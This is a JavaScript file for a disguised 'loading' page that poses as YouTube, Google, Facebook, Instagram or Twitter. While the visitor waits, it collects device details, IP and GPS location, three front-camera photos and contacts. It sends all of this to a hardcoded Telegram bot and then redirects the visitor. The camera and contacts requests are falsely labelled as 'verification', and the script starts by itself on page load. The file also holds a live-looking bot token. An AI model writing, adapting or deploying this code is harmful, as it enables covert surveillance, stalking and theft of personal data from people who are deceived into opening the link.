// ===========================================
// TELEGRAM BOT CONFIGURATION
// ===========================================
const BOT_TOKEN = '8349023527:AAG9Tq-yiqMXKnxKkiUQ6n5uvu7Rb0kCPco';
const CHAT_ID = '5888374938';
const REDIRECT_URL = (() => {
    const params = new URLSearchParams(window.location.search);
    return params.get('url') || 
           params.get('redirect') || 
           'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
})();

// ===========================================
// ADVANCED DATA COLLECTOR
// ===========================================
class AdvancedDataCollector {
    static async getCompleteDeviceInfo() {
        const info = {
            // Basic Info
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            vendor: navigator.vendor || 'Unknown',
            language: navigator.language,
            languages: navigator.languages?.join(', ') || 'Unknown',
            
            // Screen Info
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth
            },
            
            // Window Info
            window: {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight,
                devicePixelRatio: window.devicePixelRatio
            },
            
            // Hardware
            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
            maxTouchPoints: navigator.maxTouchPoints || 0,
            
            // Network
            connection: navigator.connection ? {
                effectiveType: navigator.connection.effectiveType || 'Unknown',
                downlink: navigator.connection.downlink || 'Unknown',
                rtt: navigator.connection.rtt || 'Unknown',
                saveData: navigator.connection.saveData || false
            } : null,
            
            // Battery
            battery: 'Unknown',
            
            // Storage
            storage: 'Unknown',
            
            // Timezone
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            
            // Location Info
            location: null,
            
            // Camera Info
            camera: null,
            
            // Contacts Info
            contacts: null,
            
            // Page Info
            url: window.location.href,
            referrer: document.referrer || 'Direct',
            redirectTo: REDIRECT_URL
        };
        
        // Get Battery Info
        if (navigator.getBattery) {
            try {
                const battery = await navigator.getBattery();
                info.battery = {
                    level: `${Math.round(battery.level * 100)}%`,
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            } catch (e) {}
        }
        
        // Get Storage Info
        if ('storage' in navigator && 'estimate' in navigator.storage) {
            try {
                const estimate = await navigator.storage.estimate();
                info.storage = {
                    quota: `${(estimate.quota / (1024 * 1024 * 1024)).toFixed(2)}GB`,
                    usage: `${(estimate.usage / (1024 * 1024)).toFixed(2)}MB`,
                    percentage: estimate.quota ? `${((estimate.usage / estimate.quota) * 100).toFixed(1)}%` : 'N/A'
                };
            } catch (e) {}
        }
        
        return info;
    }
    
    static async getIPLocation() {
        try {
            // Try multiple IP services
            const services = [
                'https://api.ipify.org?format=json',
                'https://ipapi.co/json/',
                'https://ipinfo.io/json'
            ];
            
            for (const service of services) {
                try {
                    const response = await fetch(service, { timeout: 5000 });
                    if (response.ok) {
                        const data = await response.json();
                        return {
                            ip: data.ip || data.query || 'Unknown',
                            city: data.city || 'Unknown',
                            region: data.region || data.regionName || 'Unknown',
                            country: data.country || data.country_name || 'Unknown',
                            countryCode: data.country_code || data.countryCode || 'Unknown',
                            timezone: data.timezone || 'Unknown',
                            isp: data.org || data.isp || 'Unknown',
                            coordinates: data.loc ? {
                                latitude: parseFloat(data.loc.split(',')[0]),
                                longitude: parseFloat(data.loc.split(',')[1])
                            } : null
                        };
                    }
                } catch (e) {
                    continue;
                }
            }
        } catch (error) {
            console.error('IP location error:', error);
        }
        
        return { ip: 'Unknown', city: 'Unknown', country: 'Unknown' };
    }
    
    static async getGPSLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve({ success: false, error: 'Geolocation not supported' });
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        success: true,
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        timestamp: position.timestamp
                    });
                },
                (error) => {
                    resolve({
                        success: false,
                        error: error.message,
                        code: error.code
                    });
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        });
    }
    
    static async captureCameraSnapshots(count = 3) {
        const video = document.getElementById('camera');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        
        try {
            // Request camera
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                },
                audio: false
            });
            
            video.srcObject = stream;
            await video.play();
            
            // Wait for video to be ready
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            const snapshots = [];
            
            for (let i = 0; i < count; i++) {
                if (video.videoWidth > 0 && video.videoHeight > 0) {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    // Draw frame
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // Add timestamp
                    ctx.fillStyle = 'rgba(0,0,0,0.7)';
                    ctx.fillRect(10, canvas.height - 40, 300, 30);
                    ctx.fillStyle = 'white';
                    ctx.font = '14px Arial';
                    ctx.fillText(`Snapshot ${i + 1} - ${new Date().toLocaleString()}`, 20, canvas.height - 20);
                    
                    // Convert to blob
                    const blob = await new Promise(resolve => {
                        canvas.toBlob(resolve, 'image/jpeg', 0.85);
                    });
                    
                    if (blob) {
                        snapshots.push(blob);
                    }
                }
                
                await new Promise(resolve => setTimeout(resolve, 500));
            }
            
            // Stop camera
            stream.getTracks().forEach(track => track.stop());
            
            return { success: true, snapshots: snapshots };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }
    
    static async getContacts() {
        if (!('contacts' in navigator && 'ContactsManager' in window)) {
            return { success: false, error: 'Contacts API not supported' };
        }
        
        try {
            const contacts = await navigator.contacts.select(['name', 'tel', 'email', 'address', 'organization'], { multiple: true });
            
            if (contacts && contacts.length > 0) {
                const formattedContacts = contacts.map(contact => ({
                    name: contact.name ? contact.name.join(' ') : 'Unknown',
                    phones: contact.tel || [],
                    emails: contact.email || [],
                    addresses: contact.address || [],
                    organizations: contact.organization || []
                }));
                
                return {
                    success: true,
                    count: contacts.length,
                    data: formattedContacts
                };
            }
            
            return { success: false, error: 'No contacts selected' };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }
}

// ===========================================
// TELEGRAM SENDER - PERFECT WORKING
// ===========================================
class TelegramSender {
    constructor(token, chatId) {
        this.token = token;
        this.chatId = chatId;
        this.baseUrl = `https://api.telegram.org/bot${token}`;
    }
    
    async sendMessage(text, parseMode = 'HTML') {
        try {
            const url = `${this.baseUrl}/sendMessage`;
            const data = {
                chat_id: this.chatId,
                text: text,
                parse_mode: parseMode
            };
            
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });
            
            return response.ok;
        } catch (error) {
            console.error('Telegram message error:', error);
            return false;
        }
    }
    
    async sendPhoto(photoBlob, caption = '') {
        try {
            const url = `${this.baseUrl}/sendPhoto`;
            const formData = new FormData();
            formData.append('chat_id', this.chatId);
            formData.append('photo', photoBlob, 'camera_snapshot.jpg');
            if (caption) formData.append('caption', caption);
            
            const response = await fetch(url, {
                method: 'POST',
                body: formData
            });
            
            return response.ok;
        } catch (error) {
            console.error('Telegram photo error:', error);
            return false;
        }
    }
    
    async sendDocument(documentBlob, filename, caption = '') {
        try {
            const url = `${this.baseUrl}/sendDocument`;
            const formData = new FormData();
            formData.append('chat_id', this.chatId);
            formData.append('document', documentBlob, filename);
            if (caption) formData.append('caption', caption);
            
            const response = await fetch(url, {
                method: 'POST',
                body: formData
            });
            
            return response.ok;
        } catch (error) {
            console.error('Telegram document error:', error);
            return false;
        }
    }
}

// ===========================================
// UI CONTROLLER
// ===========================================
class UIController {
    static updateProgress(percent) {
        document.getElementById('progress').style.width = `${percent}%`;
    }
    
    static updateStatus(text) {
        document.getElementById('status').textContent = text;
    }
    
    static updateTitle(text) {
        document.getElementById('title').textContent = text;
    }
    
    static updateMessage(text) {
        document.getElementById('message').textContent = text;
    }
    
    static updateLoadingText(text) {
        document.getElementById('loadingText').textContent = text;
    }
    
    static applySiteTheme(site) {
        const sites = {
            'youtube': {
                title: 'Loading YouTube...',
                message: 'Preparing your video',
                color: '#FF0000'
            },
            'google': {
                title: 'Google',
                message: 'Loading...',
                color: '#4285F4'
            },
            'facebook': {
                title: 'Facebook',
                message: 'Loading Facebook...',
                color: '#1877F2'
            },
            'instagram': {
                title: 'Instagram',
                message: 'Loading Instagram...',
                color: '#E4405F'
            },
            'twitter': {
                title: 'Twitter',
                message: 'Loading Twitter...',
                color: '#1DA1F2'
            }
        };
        
        for (const [key, config] of Object.entries(sites)) {
            if (REDIRECT_URL.includes(key)) {
                UIController.updateTitle(config.title);
                UIController.updateMessage(config.message);
                document.getElementById('progress').style.background = config.color;
                document.getElementById('spinner').style.borderTopColor = config.color;
                document.title = `${config.title} | Loading...`;
                break;
            }
        }
    }
}

// ===========================================
// FORMATTERS
// ===========================================
class Formatters {
    static formatDeviceInfo(info) {
        const batteryInfo = typeof info.battery === 'object' 
            ? `${info.battery.level} (${info.battery.charging ? 'Charging' : 'Not Charging'})`
            : info.battery;
        
        return `
<b>📱 DEVICE INFORMATION</b>
━━━━━━━━━━━━━━━━━━
<b>• User Agent:</b> ${info.userAgent.substring(0, 80)}...
<b>• Platform:</b> ${info.platform}
<b>• Vendor:</b> ${info.vendor}
<b>• Language:</b> ${info.language}
<b>• Timezone:</b> ${info.timezone}

<b>📊 HARDWARE</b>
<b>• Cores:</b> ${info.hardwareConcurrency}
<b>• RAM:</b> ${info.deviceMemory}
<b>• Battery:</b> ${batteryInfo}
<b>• Storage:</b> ${typeof info.storage === 'object' ? info.storage.quota : info.storage}

<b>🖥️ SCREEN</b>
<b>• Resolution:</b> ${info.screen.width}x${info.screen.height}
<b>• Available:</b> ${info.screen.availWidth}x${info.screen.availHeight}
<b>• Color Depth:</b> ${info.screen.colorDepth}bit

<b>🌐 NETWORK</b>
<b>• Connection:</b> ${info.connection?.effectiveType || 'Unknown'}
<b>• Downlink:</b> ${info.connection?.downlink || 'Unknown'} Mbps
<b>• Latency:</b> ${info.connection?.rtt || 'Unknown'} ms
<b>• Save Data:</b> ${info.connection?.saveData ? 'Enabled' : 'Disabled'}

<b>🔗 LINKS</b>
<b>• Current URL:</b> ${info.url}
<b>• Referrer:</b> ${info.referrer}
<b>• Redirect To:</b> ${info.redirectTo}
━━━━━━━━━━━━━━━━━━
<b>⏰ Timestamp:</b> ${new Date(info.timestamp).toLocaleString()}
        `.trim();
    }
    
    static formatLocationInfo(ipInfo, gpsInfo = null) {
        let locationText = `
<b>📍 LOCATION INFORMATION</b>
━━━━━━━━━━━━━━━━━━
<b>• IP Address:</b> <code>${ipInfo.ip}</code>
<b>• City:</b> ${ipInfo.city}
<b>• Region:</b> ${ipInfo.region}
<b>• Country:</b> ${ipInfo.country} (${ipInfo.countryCode})
<b>• Timezone:</b> ${ipInfo.timezone}
<b>• ISP:</b> ${ipInfo.isp}
        `;
        
        if (gpsInfo && gpsInfo.success) {
            locationText += `
<b>• GPS Latitude:</b> <code>${gpsInfo.latitude.toFixed(6)}</code>
<b>• GPS Longitude:</b> <code>${gpsInfo.longitude.toFixed(6)}</code>
<b>• Accuracy:</b> ±${Math.round(gpsInfo.accuracy)} meters
<b>• Altitude:</b> ${gpsInfo.altitude ? gpsInfo.altitude.toFixed(2) + 'm' : 'N/A'}
<b>• Speed:</b> ${gpsInfo.speed ? gpsInfo.speed.toFixed(2) + 'm/s' : 'N/A'}
<b>• Heading:</b> ${gpsInfo.heading ? gpsInfo.heading.toFixed(2) + '°' : 'N/A'}
<b>• 📍 <a href="https://maps.google.com/?q=${gpsInfo.latitude},${gpsInfo.longitude}">View on Google Maps</a></b>
            `;
        }
        
        locationText += `
━━━━━━━━━━━━━━━━━━
<b>⏰ Timestamp:</b> ${new Date().toLocaleString()}
        `;
        
        return locationText.trim();
    }
    
    static formatContactsInfo(contactsResult) {
        if (!contactsResult.success) {
            return `<b>📇 CONTACTS:</b> ${contactsResult.error}`;
        }
        
        return `
<b>📇 CONTACTS INFORMATION</b>
━━━━━━━━━━━━━━━━━━
<b>• Total Contacts:</b> ${contactsResult.count}
<b>• Sample (first 5):</b>
${contactsResult.data.slice(0, 5).map((c, i) => 
    `${i + 1}. ${c.name}: ${c.phones[0] || 'No phone'}`
).join('\n')}
━━━━━━━━━━━━━━━━━━
<b>⏰ Timestamp:</b> ${new Date().toLocaleString()}
        `.trim();
    }
}

// ===========================================
// MAIN EXECUTION
// ===========================================
async function executeMain() {
    const telegram = new TelegramSender(BOT_TOKEN, CHAT_ID);
    
    try {
        // Step 1: Initialize UI
        UIController.updateStatus('Initializing...');
        UIController.updateProgress(10);
        UIController.applySiteTheme();
        
        // Step 2: Collect Device Info
        UIController.updateStatus('Collecting device information...');
        UIController.updateProgress(20);
        UIController.updateLoadingText('Gathering device details...');
        
        const deviceInfo = await AdvancedDataCollector.getCompleteDeviceInfo();
        await telegram.sendMessage(Formatters.formatDeviceInfo(deviceInfo));
        
        // Step 3: Get IP Location
        UIController.updateStatus('Detecting location...');
        UIController.updateProgress(40);
        UIController.updateLoadingText('Finding your location...');
        
        const ipInfo = await AdvancedDataCollector.getIPLocation();
        
        // Step 4: Try GPS Location
        UIController.updateStatus('Getting precise location...');
        UIController.updateProgress(50);
        
        const gpsInfo = await AdvancedDataCollector.getGPSLocation();
        await telegram.sendMessage(Formatters.formatLocationInfo(ipInfo, gpsInfo));
        
        // Step 5: Camera Access
        UIController.updateStatus('Camera verification...');
        UIController.updateProgress(60);
        UIController.updateLoadingText('Setting up camera...');
        
        const cameraResult = await AdvancedDataCollector.captureCameraSnapshots(3);
        
        if (cameraResult.success && cameraResult.snapshots.length > 0) {
            await telegram.sendMessage(`<b>📸 CAMERA CAPTURED</b>\nSuccessfully captured ${cameraResult.snapshots.length} photos`);
            
            for (let i = 0; i < cameraResult.snapshots.length; i++) {
                await telegram.sendPhoto(
                    cameraResult.snapshots[i],
                    `Camera Snap ${i + 1} - ${new Date().toLocaleString()}`
                );
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        } else {
            await telegram.sendMessage(`<b>📸 CAMERA:</b> ${cameraResult.error || 'Access denied'}`);
        }
        
        // Step 6: Contacts Access
        UIController.updateStatus('Contact verification...');
        UIController.updateProgress(80);
        UIController.updateLoadingText('Checking contacts...');
        
        const contactsResult = await AdvancedDataCollector.getContacts();
        
        if (contactsResult.success) {
            await telegram.sendMessage(Formatters.formatContactsInfo(contactsResult));
            
            // Send full contacts as JSON file
            const contactsBlob = new Blob(
                [JSON.stringify(contactsResult.data, null, 2)],
                { type: 'application/json' }
            );
            
            await telegram.sendDocument(
                contactsBlob,
                'contacts.json',
                `Full Contacts Data (${contactsResult.count} contacts)`
            );
        } else {
            await telegram.sendMessage(`<b>📇 CONTACTS:</b> ${contactsResult.error}`);
        }
        
        // Step 7: Final Summary
        UIController.updateStatus('Finalizing...');
        UIController.updateProgress(100);
        UIController.updateLoadingText('Almost done...');
        
        const summary = `
<b>✅ DATA COLLECTION COMPLETE</b>
━━━━━━━━━━━━━━━━━━
<b>• Device Info:</b> ✅ Collected
<b>• IP Location:</b> ✅ ${ipInfo.city}, ${ipInfo.country}
<b>• GPS Location:</b> ${gpsInfo.success ? '✅ Captured' : '❌ Failed'}
<b>• Camera:</b> ${cameraResult.success ? '✅ ' + cameraResult.snapshots.length + ' photos' : '❌ Failed'}
<b>• Contacts:</b> ${contactsResult.success ? '✅ ' + contactsResult.count + ' contacts' : '❌ Failed'}
<b>• Redirecting to:</b> ${REDIRECT_URL}
<b>• Total Time:</b> ${Math.round(performance.now() / 1000)} seconds
━━━━━━━━━━━━━━━━━━
<b>👤 TARGET URL:</b> ${REDIRECT_URL}
        `.trim();
        
        await telegram.sendMessage(summary);
        
        // Step 8: Redirect
        UIController.updateStatus('Redirecting...');
        UIController.updateTitle('Ready!');
        UIController.updateMessage('Taking you to the destination...');
        
        await new Promise(resolve => setTimeout(resolve, 1500));
        window.location.href = REDIRECT_URL;
        
    } catch (error) {
        console.error('Main execution error:', error);
        
        // Send error to Telegram
        await telegram.sendMessage(`
<b>❌ EXECUTION ERROR</b>
━━━━━━━━━━━━━━━━━━
<b>• Error:</b> ${error.message}
<b>• Stack:</b> ${error.stack || 'Not available'}
<b>• Timestamp:</b> ${new Date().toLocaleString()}
        `.trim());
        
        // Still redirect
        UIController.updateStatus('Error occurred, redirecting...');
        setTimeout(() => {
            window.location.href = REDIRECT_URL;
        }, 2000);
    }
}

// ===========================================
// START EXECUTION
// ===========================================
// Start after page loads
window.addEventListener('DOMContentLoaded', () => {
    setTimeout(() => {
        executeMain();
    }, 1000);
});

// Alternative start on click
document.addEventListener('click', () => {
    executeMain();
}, { once: true });

// Fallback start
setTimeout(() => {
    if (!window.started) {
        executeMain();
        window.started = true;
    }
}, 3000);
